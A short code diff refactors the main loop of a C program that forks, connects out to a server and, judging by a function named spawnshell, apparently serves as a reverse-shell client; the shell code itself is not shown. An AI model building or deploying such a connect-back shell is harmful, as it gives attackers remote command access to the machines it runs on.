@@ -19,7 +19,7 @@ void spawnshell(int sock)
 
 int main(int argc, char *argv[])
 {
-    int sock, socket_fd, client_len;
+    int sock;
     struct sockaddr_in server, client;
 
     signal(SIGCHLD, SIG_IGN);
@@ -30,16 +30,15 @@ int main(int argc, char *argv[])
     while (1)
     {
 
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0)
+        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
         {
             exit(1);
         }
 
         if (fork() == 0)
         {
-            int rc = connect(sock, (struct sockaddr *)&server, sizeof server);
-            if (rc < 0)
+
+            if ((connect(sock, (struct sockaddr *)&server, sizeof server)) < 0)
             {
                 exit(2);
             }
